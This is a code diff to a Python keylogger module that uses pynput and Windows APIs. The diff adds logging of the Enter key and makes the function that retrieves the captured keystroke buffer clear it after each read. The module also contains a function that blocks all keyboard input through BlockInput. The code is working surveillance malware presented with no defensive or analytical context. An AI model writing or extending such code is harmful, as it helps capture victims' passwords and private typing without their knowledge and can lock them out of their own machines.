@@ -1,4 +1,4 @@
-from pynput.keyboard import Listener
+from pynput.keyboard import Listener, Key
 from ctypes import windll
 
 key_log = ''
@@ -6,10 +6,12 @@ listener = None
 
 def on_press(key):
     global key_log
+
     try:
         key_log += key.char
     except AttributeError:
-        pass
+        if key == Key.enter:
+            key_log += 'Enter\n'
 
 
 def listening_keyboard(listening=True):
@@ -28,7 +30,10 @@ def listening_keyboard(listening=True):
 def get_key_log():
     global key_log
 
-    return key_log
+    result = key_log
+    key_log = ''
+
+    return result
 
 def set_block_keyboard(block):
     return windll.user32.BlockInput(block)
